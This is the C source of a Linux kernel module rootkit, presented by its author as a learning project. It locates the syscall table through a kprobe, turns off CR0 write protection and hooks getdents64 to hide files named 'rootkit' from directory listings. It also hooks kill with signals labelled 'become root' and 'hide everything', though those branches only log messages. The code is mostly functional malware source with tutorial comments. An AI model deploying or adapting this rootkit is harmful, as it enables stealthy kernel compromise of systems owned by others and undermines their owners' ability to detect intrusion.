// This is a kernel module rootkit
// I made this to help me learn about rootkits
// USE AT YOUR OWN RISK because this was only tested ony my ubuntu machine, and it's just a learning project
// I am not responsible for anything that you do with this
//
// The features this kernel module have:
// 1. hides itself from 'ls' type commands (wont be shown in directories and such)
// 2. hides it's own process


/* NOTES FOR MYSELF AND HOW TO WORK WITH KERNEL MODULES */
// Read kernel messages:
// To see 'printk' output use 'sudo dmesg', and to clear dmesg you can do 'sudo dmesg --clear'
// You can also read the kernel logs in this file: /var/log/kern.log
//
// Loading kernel module:
// To load into kernel, after making the file:
// sudo insmod rootkit.ko
// lsmod                    --> here you can see that rootkit.ko was loaded into the kernel
// sudo dmesg               --> you will see the 'printk' output
// sudo rmmod rootkit.ko    --> removes the module from the kernel
//
// Find the syscalls for your system:
// In most distros there should be a file '/proc/kallsyms' (stands for 'kernel all symbols' I think)
// In there we can look for the syscall table's memory address
// cat /proc/kallsyms | grep sys_call_table     --> Find syscall table memory address
// !!! THE SYSCALL TABLE ADDRESS CHANGES EACH TIME, SO YOU CAN'T JUST COPY THE ADDRESS AND USE IT !!!
// So how do we deal with this?
// We can do:
// cat /proc/kallsyms | grep kallsyms_lookup_name     --> Find kallsyms_lookup_name kernel functions memory address
// This function is used inside the linux kernel to lookup system call names,
// if it finds the syscall, it will return the memory address for that syscall, if it doesn't it returns 0.
// So, we can use this to find the memory address of the sys_call_table every time we load our kernel module


#include <linux/init.h>       // Macros used to mark up functions (ex: __init __exit)
#include <linux/module.h>     // Core header for loading LKMs (loadable kernel modules) into the kernel
#include <linux/kernel.h>     // Contains types, macros, functions for the kernel (ex: KERN_INFO)
#include <linux/kallsyms.h>   // Contains functions (ex: kallsyms_lookup_name)
#include <linux/kprobes.h>    // Used this because above header doesn't export kallsyms_lookup_name anymore
#include <linux/unistd.h>     // Contains syscall numbers (each syscall is assigned a number, this helps us access them by name)
#include <linux/version.h>    // Linux/Kernel versions (ex: LINUX_VERSION_CODE, KERNEL_VERSION)
#include <asm/paravirt.h>     // Contains function for read_cr0() --> read control register 0, needed to protect/unprotect memory
#include <linux/dirent.h>     // Contains dirent struct

/* Module Information */
MODULE_LICENSE("GPL");  // Could not run 'make' without this, I guess it is mandatory
// MODULE_AUTHOR("Jakored");
// MODULE_DESCRIPTION("A rootkit I made as a learning project, not meant for use");
// MODULE_VERSION("0.0.1");

// Declaring variables
unsigned long *__sys_call_table;                   // will hold the address of the sys_call_table
unsigned long (*kallsyms_lookup_name_ptr)(char*);  // will hold the address of the kallsyms_lookup_name function


// Creating objects to store the original syscalls addresses
#ifdef CONFIG_X86_64
/* At least on 64-bit x86, it will be a hard requirement from v4.17 onwards
to not call system call functions in the kernel. It uses a different calling
convention for system calls where struct pt_regs is decoded on-the-fly in a
syscall wrapper which then hands processing over to the actual syscall function.
https://www.kernel.org/doc/html/v4.17/process/adding-syscalls.html */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
#define PTREGS_SYSCALL_STUB 1
// In newer kernels we only need to make one typedef
// Then we can just create more 'static ptregs_t orig_SYSCALL' for each syscall
typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs);
static ptregs_t orig_kill;  // for 'kill' command
static ptregs_t orig_getdents64;  // for commands like 'ls' that list dirs
#else
// In older kernels we need to create a new typedef for each syscall,
// and have it take the same arguments the syscall takes (can be seen in the kernel code on github or somewhere else online)
typedef asmlinkage long (*orig_kill_t)(pid_t pid, int sig);  // for 'kill' command
static orig_kill_t orig_kill;  // for 'kill' command
typedef asmlinkage long (*orig_getdents64_t)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);  // for commands like 'ls' that list dirs
static orig_getdents64_t orig_getdents64;  // for commands like 'ls' that list dirs
#endif
#endif


/****************************************
 *           HACKED FUNCTIONS           *
****************************************/
/* HACKED "KILL" FUNCTION */
enum signals {
    SIGSUPER = 64,  // become root
    SIGINVIS = 63,  // hide everything associated to rootkit
};
#if PTREGS_SYSCALL_STUB
static asmlinkage long hack_kill(const struct pt_regs *regs)
{
    int sig = regs->si;

    // If kill was given one of our numbers
    if (sig == SIGSUPER) {
        printk(KERN_INFO "rootkit: become root\n");
        return 0;
    } else if (sig == SIGINVIS) {
        printk(KERN_INFO "rootkit: hide everything\n");
        return 0;
    }

    // If we weren't given one of our numbers, then return original syscall results
    return orig_kill(regs);
}
#else
static asmlinkage long hack_kill(pid_t pid, int sig)
{
    // If kill was given one of our numbers
    if (sig == SIGSUPER) {
        printk(KERN_INFO "rootkit: become root\n");
        return 0;
    } else if (sig == SIGINVIS) {
        printk(KERN_INFO "rootkit: hide everything\n");
        return 0;
    }
    // If we weren't given one of our numbers, then return original syscall results
    return orig_kill(pid, sig);
}
#endif

/* HACKED "LS" FUNCTION */
// Affects any function that attempts to list files and such, this will hide all files that contain our rootkits name (rootkit) in their filename
// this is the syscall we need to hook: getdents64
// We call the original getdents64 function, see if any of the files returned contain our rootkits name, and remove them from the final result we return
#if PTREGS_SYSCALL_STUB
static asmlinkage long hack_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 *cur = regs->si;  // getting current directory pointer (I think) from the syscalls variables
    int rtn = orig_getdents64(regs);  // getting the size(or is it legnth?) of the original output from the syscall

    // Going over every file that was returned and removing our own
    int i = 0;
    while (i < rtn) {
        if (strncmp(cur->d_name, "rootkit", strlen("rootkit")) == 0) {  // hiding any file that starts with rootkit
            // getting the offset from one struct linux_dirent64 to the next in the buffer filled by this syscall (space in memory between the linux_dirent64 structs)
            int reclen = cur->d_reclen;
            // getting the next struct linux_dirent64 address
            char *next_rec = (char *)cur + reclen;
            // the length of the current struct linux_dirent64
            int len = (int)regs->si + rtn - (int)next_rec;
            
            // moving the pointer in memory to the address of the next struct linux_dirent64
            memmove(cur, next_rec, len);
            rtn -= reclen;
            continue;
        }
        i += cur->d_reclen;
        cur = (struct linux_dirent64*) ((char*)regs->si + i);
    }
    return rtn;
    // return original results
    // return orig_getdents64(regs);
}
#else
static asmlinkage long hack_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
{
    struct linux_dirent64 *cur = dirp;  // getting current directory pointer (I think) from the syscalls variables
    int rtn = orig_getdents64(fd, dirp, count);  // getting the original output from the syscall

    int i = 0;
    while (i < rtn) {
        if (strncmp(cur->d_name, "rootkit", strlen("rootkit")) == 0) {
            int reclen = cur->d_reclen;
            char *next_rec = (char *)cur + reclen;
            int len = (int)dirp + rtn - (int)next_rec;
            memmove(cur, next_rec, len);
            rtn -= reclen;
            continue;
        }
        i += cur->d_reclen;
        cur = (struct linux_dirent*) ((char*)dirp + i);
    }
    return rtn;
    // return original results
    // return orig_getdents64(regs);
}
#endif
/****************************************
 *         HACKED FUNCTIONS END         *
****************************************/

/* Returns syscall table to original state */
static int cleanup(void)
{
    /* kill */
    __sys_call_table[__NR_kill] = (unsigned long)orig_kill;  // returning kill syscall address to original address
    /* getdents64 ('ls' functions and stuff like that) */
    __sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;  // returning getdents64 syscall address to original address

    return 0;
}

/* Stores original syscalls address */
static int store(void)
{
    // This function stores the original syscalls, so we can return them after we are finished hooking them

    /* If LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0) syscall use pt_regs stub */
    #if PTREGS_SYSCALL_STUB
        /* kill */
        orig_kill = (ptregs_t)__sys_call_table[__NR_kill];
        printk(KERN_INFO "rootkit: orig_kill table entry successfully stored\n");
        /* getdents64 ('ls' functions and stuff like that) */
        orig_getdents64 = (ptregs_t)__sys_call_table[__NR_getdents64];
        printk(KERN_INFO "rootkit: orig_getdents64 table entry successfully stored\n");
    /* If LINUX_VERSION_CODE < KERNEL_VERSION(4, 17, 0) */
    #else
        /* kill */
        orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
        printk(KERN_INFO "rootkit: orig_kill table entry successfully stored\n");
        /* getdents64 ('ls' functions and stuff like that) */
        orig_getdents64 = (orig_getdents64_t)__sys_call_table[__NR_getdents64];
        printk(KERN_INFO "rootkit: orig_getdents64 table entry successfully stored\n");
    #endif

    return 0;
}

/* Hooks syscalls */
static int hook(void)
{
    // This function hooks the syscalls, putting our "hacked" functions address instead of the syscall

   /* kill */
    __sys_call_table[__NR_kill] = (unsigned long)&hack_kill;  // overwriting the kill syscall to our function
    /* getdents64 ('ls' functions and stuff like that) */
    __sys_call_table[__NR_getdents64] = (unsigned long)&hack_getdents64;  // overwriting the getdents64 syscall to our function

   return 0;
}


static inline void write_cr0_forced(unsigned long val)
{
    /*
    By default the memory is protected, so currently, we can't override the syscall table (which is in the memory).
    To deal with this we need a function that can protect and unprotect memory.
    Intel processors have a register called CR0, which is set to protect the memory.
    We are going to change the 16th bit in the cr0 register so that the memory becomes unprotected.
    Googling "linux kernel rootkit cr0 memory" will help get a better understading of this if needed,
    specifically these links seem good:
    https://jm33.me/we-can-no-longer-easily-disable-cr0-wp-write-protection.html
    https://stackoverflow.com/questions/58512430/how-to-write-to-protected-pages-in-the-linux-kernel
    */

   unsigned long __force_order;

    /* __asm__ __volatile__( */
    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order)
        /* To prevent reads from being reordered with respect to writes, use a dummy memory operand. "+m"(__force_order) */
    );
}

/* Disables memory write protection */
static void unprotect_memory(void)
{
    /* Bitwise AND (&) copies bit to result if it is in both operands
     * Unary reverse (~) reverses the bits so ~0x10000 becomes 0x01111 */
    write_cr0_forced(read_cr0() & (~ 0x10000));
    printk(KERN_INFO "rootkit: unprotected memory\n");
}


/* Enables memory write protection */
static void protect_memory(void)
{
    /* Bitwise OR (|) copies bit to result if it is in neither operands */
    write_cr0_forced(read_cr0() | (0x10000));
    printk(KERN_INFO "rootkit: protected memory\n");
}


static unsigned long lookup_kallsyms_lookup_name(void) 
{
    /*
    Turns out that the function kallsyms_lookup_name is needed but can't be accessed directly anymore due to security reasons.
    After kernel 5.7.7, the function kallsyms_lookup_name is not exported so we can't access it directly.
    I found two sites that deal with this issue similarly:
    https://nskernel.gitbook.io/kernel-play-guide/accessing-the-non-exported-in-modules
    https://github.com/xcellerator/linux_kernel_hacking/issues/3
    https://xcellerator.github.io/posts/linux_rootkits_11/
    */
    // This function returns the address of the kallsyms_lookup_name kernel function

    struct kprobe kp;
    unsigned long addr;
    
    memset(&kp, 0, sizeof(struct kprobe));
    kp.symbol_name = "kallsyms_lookup_name";
    if (register_kprobe(&kp) < 0) {
        return 0;
    }
    addr = (unsigned long)kp.addr;
    unregister_kprobe(&kp);
    return addr;
}


static unsigned long *get_syscall_table(void)
{
    /* 
    This function returns a pointer to the memory address of the syscall table.
    It can be good to do this in a function, 
    because different kernel versions might require different actions to get the address of the syscall table.
    So just add different methods here for every linux kernel version
    */

    unsigned long *syscall_table;

    // The '#' is a pre-processor directive, pre-processor directives are run before compiling the code
    #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
        // Getting the address of the kallsyms_lookup_name function
        kallsyms_lookup_name_ptr = lookup_kallsyms_lookup_name();
        printk(KERN_INFO "rootkit: kallsyms_lookup_name address is 0x%px \n", kallsyms_lookup_name_ptr);
        syscall_table = (unsigned long*)(*kallsyms_lookup_name_ptr)("sys_call_table");
        printk(KERN_INFO "rootkit: sys_call_table address is 0x%px \n", syscall_table);
    #else
        syscall_table = NULL;   // NULL equals to: (void*)0    So we will return a void pointer if we are using an old linux version
    #endif

    return syscall_table;
}


static int __init mod_init(void)
    // This function (__init) runs when we insert the kernel module
{
    int err = 1;  // variable to store error return code throughout the code

    printk(KERN_INFO "rootkit: started\n");

    __sys_call_table = get_syscall_table();  // get syscall table memory address

    if (!__sys_call_table) {  // If we couldn't get the syscall table
        printk(KERN_INFO "rootkit: could not get syscall table\n");
        return err;
    }

    if (store() == err) {  // Storing the original syscalls addresses
        printk(KERN_INFO "rootkit: store error\n");
    }

    unprotect_memory();

    if (hook() == err) {  // Hooking our functions instead of the original syscalls
        printk(KERN_INFO "rootkit: error hooking functions\n");
    }

    protect_memory();

    return 0;
}


static void __exit mod_exit(void)
    // This function (__exit) runs when we exit the kernel module
{
    int err = 1;  // variable to store error return code throughout the code

    unprotect_memory();
    if (cleanup() == err) {  // Rewriting original syscall functions to the syscall table
        printk(KERN_INFO "rootkit: error returning syscall table to original state\n");
    }
    protect_memory();

    printk(KERN_INFO "rootkit: exited\n");

}


module_init(mod_init);  // Load init function
module_exit(mod_exit);  // Load exit function

